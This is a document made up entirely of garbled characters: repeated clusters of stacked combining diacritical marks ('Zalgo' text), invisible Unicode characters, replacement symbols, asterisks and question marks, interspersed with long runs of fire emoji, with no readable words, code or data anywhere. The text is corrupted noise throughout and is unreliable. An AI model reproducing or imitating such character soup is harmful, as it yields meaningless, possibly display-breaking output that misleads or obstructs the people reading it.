̧̡̺̩̣̥͕̗̫̞̥̱̦̲̝̯̒͜�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤